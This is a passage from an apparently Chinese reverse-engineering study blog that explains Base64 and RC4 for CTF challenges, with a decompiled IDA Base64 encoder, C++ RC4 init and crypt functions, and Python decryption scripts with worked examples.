punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"加密结果: \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">base64_encode</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> input_length<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"*************************************\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"解密结果: \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">base64_decode</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> input_length<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"*************************************"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="IDA-示例"><a href="#IDA-示例" class="headerlink" title="IDA 示例"></a>IDA 示例</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">char</span> <span class="token operator">*</span>__fastcall <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>a1<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment">// eax  </span>    <span class="token keyword">int</span> v2<span class="token punctuation">;</span> <span class="token comment">// eax  </span>    <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment">// eax  </span>    <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment">// eax  </span>    <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment">// eax  </span>    <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment">// eax  </span>    <span class="token keyword">int</span> v8<span class="token punctuation">;</span> <span class="token comment">// [rsp+1Ch] [rbp-54h]  </span>    <span class="token keyword">int</span> v9<span class="token punctuation">;</span> <span class="token comment">// [rsp+20h] [rbp-50h]  </span>    <span class="token keyword">int</span> v10<span class="token punctuation">;</span> <span class="token comment">// [rsp+24h] [rbp-4Ch]  </span>    <span class="token keyword">int</span> v11<span class="token punctuation">;</span> <span class="token comment">// [rsp+24h] [rbp-4Ch]  </span>    <span class="token keyword">int</span> v12<span class="token punctuation">;</span> <span class="token comment">// [rsp+24h] [rbp-4Ch]  </span>    <span class="token keyword">int</span> v13<span class="token punctuation">;</span> <span class="token comment">// [rsp+28h] [rbp-48h]  </span>    <span class="token keyword">int</span> v14<span class="token punctuation">;</span> <span class="token comment">// [rsp+2Ch] [rbp-44h]  </span>    <span class="token keyword">char</span> src<span class="token punctuation">[</span><span class="token number">56</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+30h] [rbp-40h]  </span>    <span class="token keyword">unsigned</span> __int64 v16<span class="token punctuation">;</span> <span class="token comment">// [rsp+68h] [rbp-8h]  </span>        v16 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    v1 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>a1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// a1为输入的字符串  </span>    v14 <span class="token operator">=</span> v1 <span class="token operator">%</span> <span class="token number">3</span><span class="token punctuation">;</span>   <span class="token comment">// v14为输入字符串长度除3以后的余数  </span>    v13 <span class="token operator">=</span> v1 <span class="token operator">/</span> <span class="token number">3</span><span class="token punctuation">;</span>   <span class="token comment">// v13为3个一组的字符组合数量  </span>    <span class="token function">memset</span><span class="token punctuation">(</span>src<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x30uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    v10 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    v8 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    v9 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span> v8 <span class="token operator">&lt;</span> v13 <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        v2 <span class="token operator">=</span> v10<span class="token punctuation">;</span>        v11 <span class="token operator">=</span> v10 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token comment">// 第一个：第一个字符右移2位，取前6位作为索引值，查找对应字符</span>        src<span class="token punctuation">[</span>v2<span class="token punctuation">]</span> <span class="token operator">=</span> base64_table<span class="token punctuation">[</span>a1<span class="token punctuation">[</span>v9<span class="token punctuation">]</span> <span class="token operator">>></span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            v3 <span class="token operator">=</span> v11<span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token comment">// 第二个：第一个字符取后2位与第二个字符的前4位拼接    </span>        src<span class="token punctuation">[</span>v3<span class="token punctuation">]</span> <span class="token operator">=</span> base64_table<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token number">16</span> <span class="token operator">*</span> <span class="token punctuation">(</span>a1<span class="token punctuation">[</span>v9<span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>a1<span class="token punctuation">[</span>v9 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">>></span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token comment">// 第三个：第二个字符取后4位与第三个字符的前2位拼接，查找对应字符    </span>        src<span class="token punctuation">[</span>v11<span class="token punctuation">]</span> <span class="token operator">=</span> base64_table<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token number">4</span> <span class="token operator">*</span> <span class="token punctuation">(</span>a1<span class="token punctuation">[</span>v9 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0xF</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>a1<span class="token punctuation">[</span>v9 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">>></span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>          v4 <span class="token operator">=</span> v11 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>            v10 <span class="token operator">=</span> v11 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">;</span>            <span class="token comment">// 第四个：第三个字符取后6位作为索引，查找对应字符  </span>        src<span class="token punctuation">[</span>v4<span class="token punctuation">]</span> <span class="token operator">=</span> base64_table<span class="token punctuation">[</span>a1<span class="token punctuation">[</span>v9 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0x3F</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            v9 <span class="token operator">+=</span> <span class="token number">3</span><span class="token punctuation">;</span>            <span class="token operator">++</span>v8<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> v14 <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>    <span class="token comment">// 余数为1，则需要添加两个等号    </span>        src<span class="token punctuation">[</span>v10<span class="token punctuation">]</span> <span class="token operator">=</span> base64_table<span class="token punctuation">[</span>a1<span class="token punctuation">[</span>v9<span class="token punctuation">]</span> <span class="token operator">>></span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            src<span class="token punctuation">[</span>v10 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> base64_table<span class="token punctuation">[</span><span class="token number">16</span> <span class="token operator">*</span> <span class="token punctuation">(</span>a1<span class="token punctuation">[</span>v9<span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token function">strcat</span><span class="token punctuation">(</span>src<span class="token punctuation">,</span> <span class="token string">"=="</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> v14 <span class="token operator">==</span> <span class="token number">2</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>   <span class="token comment">// 余数为2，则需要添加1个等号      </span>        v5 <span class="token operator">=</span> v10<span class="token punctuation">;</span>            v12 <span class="token operator">=</span> v10 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>            src<span class="token punctuation">[</span>v5<span class="token punctuation">]</span> <span class="token operator">=</span> base64_table<span class="token punctuation">[</span>a1<span class="token punctuation">[</span>v9<span class="token punctuation">]</span> <span class="token operator">>></span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            v6 <span class="token operator">=</span> v12<span class="token operator">++</span><span class="token punctuation">;</span>            src<span class="token punctuation">[</span>v6<span class="token punctuation">]</span> <span class="token operator">=</span> base64_table<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token number">16</span> <span class="token operator">*</span> <span class="token punctuation">(</span>a1<span class="token punctuation">[</span>v9<span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>a1<span class="token punctuation">[</span>v9 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">>></span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            src<span class="token punctuation">[</span>v12<span class="token punctuation">]</span> <span class="token operator">=</span> base64_table<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> <span class="token punctuation">(</span>a1<span class="token punctuation">[</span>v9 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0xF</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            src<span class="token punctuation">[</span>v12 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'='</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token function">strcpy</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> src<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> a1<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="RC4"><a href="#RC4" class="headerlink" title="RC4"></a>RC4</h1><blockquote><p>RC4 是对称加密算法，通过密钥 key 和 S 盒生成密钥流，明文逐字节异或 S 盒，同时 S 盒也会发生改变<br>加密与解密使用了相同的函数和密钥 K，加密的强度主要来源于密钥的安全性，密钥泄露能直接解密出明文</p><p><em>相关 Writeup 见 《【攻防世界】crypt》、《【攻防世界】ereere》</em></p></blockquote><h2 id="特点-1"><a href="#特点-1" class="headerlink" title="特点"></a>特点</h2><ol><li><p>RC4 加密算法属于流加密算法，包括<strong>初始化函数</strong>和<strong>加解密函数</strong></p></li><li><p><strong>初始化函数</strong>中有两个 256 循环，第一个循环给 s 盒初始化为 0 - 255，第二个循环根据密钥 key 对 s 盒 swap</p></li><li><p><strong>加解密函数</strong>中有一个 256 循环，使明文和 s 盒异或生成密文</p></li></ol><hr><h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><h3 id="初始化部分"><a href="#初始化部分" class="headerlink" title="初始化部分"></a>初始化部分</h3><p>初始化长度为 256 的 S 盒。第一个 for 循环将 0 到 255 的互不重复的元素装入 S 盒；第二个 for 循环根据密钥 key 打乱 S 盒，i 确保 S-box 的每个元素都得到处理，j 保证 S-box 的搅乱是随机的</p><p>不同的 S-box 在经过伪随机子密码生成算法的处理后可以得到不同的子密钥序列，将 S-box 和明文进行 xor 运算，得到密文，解密过程也完全相同</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">rc4_init</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span>s<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span>key<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> key_Len<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> k<span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token comment">//临时向量 k</span>    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> tmp <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">256</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>        k<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token punctuation">)</span> key<span class="token punctuation">[</span>i <span class="token operator">%</span> key_Len<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">//Len = strlen(key)，密钥的长度</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">256</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">//打乱s表</span>        j <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> k<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">;</span>        tmp <span class="token operator">=</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> s<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">//交换s[i]和s[j]</span>        s<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> tmp<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h3 id="加解密部分"><a href="#加解密部分" class="headerlink" title="加解密部分"></a>加解密部分</h3><p>每收到一个字节，就进行循环。通过一定的算法定位 S 盒中的一个元素，并与输入字节异或，得到 k；同时，循环中还改变了 S 盒</p><p>如果输入的是明文，输出的就是密文；如果输入的是密文，输出的就是明文</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">rc4_crypt</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span>s<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span>Data<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> Data_Len<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> t <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> tmp<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> k <span class="token operator">&lt;</span> Data_Len<span class="token punctuation">;</span> k<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        i <span class="token operator">=</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">;</span>        j <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">;</span>        tmp <span class="token operator">=</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> s<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">//交换s[i]和s[j]</span>        s<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> tmp<span class="token punctuation">;</span>        t <span class="token operator">=</span> <span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> s<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">;</span>        Data<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">^=</span> s<span class="token punctuation">[</span>t<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="加解密代码-1"><a href="#加解密代码-1" class="headerlink" title="加解密代码"></a>加解密代码</h2><h3 id="Python-版（简洁脚本）-1"><a href="#Python-版（简洁脚本）-1" class="headerlink" title="Python 版（简洁脚本）"></a>Python 版（简洁脚本）</h3><ul><li><p><strong>特点</strong></p><ol><li>利用 Python 库快捷实现 RC4 算法</li><li><code>Key</code> 表示 RC4 的密钥，<code>Str</code> 表示待加解密的内容 <strong>（bytes 型）</strong></li></ol></li><li><p><strong>代码</strong></p></li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> ARC4Str <span class="token operator">=</span> <span class="token string">b''</span>Key <span class="token operator">=</span> <span class="token string">""</span>flag <span class="token operator">=</span> ARC4<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">(</span>Key<span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>Str<span class="token punctuation">)</span>  <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><strong>示例</strong></li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python">Str <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">217</span><span class="token punctuation">,</span> <span class="token number">79</span><span class="token punctuation">,</span> <span class="token number">52</span><span class="token punctuation">,</span> <span class="token number">168</span><span class="token punctuation">,</span> <span class="token number">29</span><span class="token punctuation">,</span> <span class="token number">108</span><span class="token punctuation">,</span> <span class="token number">198</span><span class="token punctuation">,</span> <span class="token number">213</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">114</span><span class="token punctuation">,</span> <span class="token number">152</span><span class="token punctuation">,</span> <span class="token number">198</span><span class="token punctuation">,</span> <span class="token number">117</span><span class="token punctuation">,</span> <span class="token number">185</span><span class="token punctuation">,</span> <span class="token number">143</span><span class="token punctuation">]</span>  <span class="token comment"># 待加解密的内容  </span>Key <span class="token operator">=</span> <span class="token string">"SecretKey"</span>  <span class="token comment"># 密钥key  </span>  Str <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>Str<span class="token punctuation">)</span><span class="token triple-quoted-string string">''' 输出：b'password123456789''''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h3 id="Python-版（具体实现）"><a href="#Python-版（具体实现）" class="headerlink" title="Python 版（具体实现）"></a>Python 版（具体实现）</h3><ul><li><p><strong>特点</strong></p><ol><li>包含具体实现流程</li></ol></li><li><p><strong>代码</strong></p></li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python">Str <span class="token operator">=</span> <span class="token string">""</span>    <span class="token comment"># 待加解密的内容</span>Key <span class="token operator">=</span> <span class="token string">""</span>    <span class="token comment"># 密钥key</span>flag <span class="token operator">=</span> <span class="token string">""</span>   <span class="token comment"># 存放加解密后的结果</span><span class="token comment"># ---------- rc4_init ----------</span>s_box <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token comment"># 定义 s 盒</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 生成初始 s 盒</span>    s_box<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>    <span class="token comment">#   T[i] = K[i mod len(Key)]    # 这个算法里没有 T[i]，下面会解释</span>t <span class="token operator">=</span> <span class="token number">0</span>j <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 打乱 s 盒顺序</span>    tmp <span class="token operator">=</span> s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    j <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>Key<span class="token punctuation">[</span>t<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span>     <span class="token comment"># j = (j + S[i] + T[i]) mod 256</span>    s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> s_box<span class="token punctuation">[</span>j<span class="token punctuation">]</span>    s_box<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> tmp    t <span class="token operator">=</span> t <span class="token operator">+</span> <span class="token number">1</span>               <span class="token comment"># 这里引入的 t 加一个 if 条件其实就是为了做 t = i % len(Key)</span>    <span class="token keyword">if</span> t <span class="token operator">>=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>Key<span class="token punctuation">)</span><span class="token punctuation">:</span>       <span class="token comment"># Key[t] 配合 t = i % len(Key) 就是实现了 T[i] = K[i mod len(Key)]</span>        t <span class="token operator">=</span> <span class="token number">0</span>               <span class="token comment"># 小细节写法不同而已，大致思路是一样的</span><span class="token comment"># ---------- rc4_crypt ----------</span>i <span class="token operator">=</span> <span class="token number">0</span>j <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>Str<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    i <span class="token operator">=</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span>    j <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span>      <span class="token comment"># &amp; 0xff 是为了做 % 256，两者效果相同</span>    tmp <span class="token operator">=</span> s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> s_box<span class="token punctuation">[</span>j<span class="token punctuation">]</span>    s_box<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> tmp    t <span class="token operator">=</span> <span class="token punctuation">(</span>s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> s_box<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span>    <span class="token comment"># &amp; 0xff 是为了做 % 256，两者效果相同</span>    flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>Str<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">^</span> s_box<span class="token punctuation">[</span>t<span class="token punctuation">]</span><span class="token punctuation">)</span>      <span class="token comment"># 明文异或得密文，密文异或得明文</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"解密结果: "</span> <span class="token operator">+</span> flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><strong>示例</strong></li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python">Str <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">217</span><span class="token punctuation">,</span> <span class="token number">79</span><span class="token punctuation">,</span> <span class="token number">52</span><span class="token punctuation">,</span> <span class="token number">168</span><span class="token punctuation">,</span> <span class="token number">29</span><span class="token punctuation">,</span> <span class="token number">108</span><span class="token punctuation">,</span> <span class="token number">198</span><span class="token punctuation">,</span> <span class="token number">213</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">114</span><span class="token punctuation">,</span> <span class="token number">152</span><span class="token punctuation">,</span> <span class="token number">198</span><span class="token punctuation">,</span> <span class="token number">117</span><span class="token punctuation">,</span> <span class="token number">185</span><span class="token punctuation">,</span> <span class="token number">143</span><span class="token punctuation">]</span>  <span class="token comment"># 待加解密的内容  </span>Key <span class="token operator">=</span> <span class="token string">"SecretKey"</span>  <span class="token comment"># 密钥key  </span>flag <span class="token operator">=</span> <span class="token string">""</span>  <span class="token comment"># 存放加解密后的结果</span><span class="token triple-quoted-string string">''' 输出：解密结果: password123456789'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h3 id="C-版（具体实现）"><a href="#C-版（具体实现）" class="headerlink" title="C++ 版（具体实现）"></a>C++ 版（具体实现）</h3><ul><li><p><strong>特点</strong></p><ol><li>包含具体实现流程</li></ol></li><li><p><strong>代码</strong></p></li></ul><pre class="line-numbers language-cpp" data-language="cpp"><code 